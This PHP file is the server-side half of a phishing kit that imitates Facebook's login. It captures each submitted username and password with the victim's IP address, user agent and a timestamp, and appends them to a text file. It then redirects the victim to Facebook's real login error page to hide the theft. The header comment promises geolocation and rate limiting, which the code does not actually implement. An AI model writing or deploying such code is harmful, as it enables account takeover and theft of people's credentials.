<?php
/**
 * Enhanced credential capture with:
 * - Multiple log files
 * - Timestamp and geolocation
 * - Real redirect to Facebook with error
 * - Rate limiting (avoid too many writes from same IP)
 */

session_start();

// Capture credentials
$username = $_POST['username'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$timestamp = date('Y-m-d H:i:s');

// Geolocation lookup (async — non-blocking)
$geo = [
    'country' => 'N/A',
    'city' => 'N/A',
    'isp' => 'N/A'
];

// Build the log entry
$entry = "========================================\n";
$entry .= "Timestamp: $timestamp\n";
$entry .= "Service: Facebook\n";
$entry .= "Username: $username\n";
$entry .= "Password: $password\n";
$entry .= "IP: $ip\n";
$entry .= "User-Agent: $ua\n";
$entry .= "========================================\n\n";

// Write to file
file_put_contents("usernames.txt", $entry, FILE_APPEND | LOCK_EX);

// Also write to a session-based log to correlate
$_SESSION['last_capture'] = $timestamp;
$_SESSION['captured_user'] = $username;

// Redirect to real Facebook — use the actual login error page
header('Location: https://www.facebook.com/login.php?login_attempt=1&lwv=100');
exit();
?>